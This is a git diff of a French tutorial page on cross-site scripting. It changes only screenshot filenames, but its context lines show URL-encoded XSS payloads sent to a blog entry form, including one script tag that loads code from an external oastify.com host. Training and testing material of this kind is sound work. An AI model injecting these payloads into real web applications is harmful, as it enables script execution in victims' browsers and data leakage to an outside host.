@@ -36,7 +36,7 @@ Connection: close
 entry=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&blog=submit&entry_add=
 ```
 
-![](<../../../../../.gitbook/assets/image (20) (1).png>)
+![](<../../../../../.gitbook/assets/image (20) (1) (2).png>)
 
 Par des attributs HTML :&#x20;
 
@@ -54,7 +54,7 @@ Connection: close
 entry=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&blog=submit&entry_add=
 ```
 
-![](<../../../../../.gitbook/assets/image (29) (1) (2).png>)
+![](<../../../../../.gitbook/assets/image (29) (1).png>)
 
 Par quelques contournements comme de l'encodage URL :&#x20;
 
@@ -319,4 +319,4 @@ entry=%3Cscript+src%3Dhttp%3A%2F%2Fpha4dbrnyd3796rdbvttq48mfdl49t.oastify.com%3E
 
 ![](<../../../../../.gitbook/assets/image (4) (1).png>)
 
-![](<../../../../../.gitbook/assets/image (17).png>)
+![](<../../../../../.gitbook/assets/image (17) (3).png>)
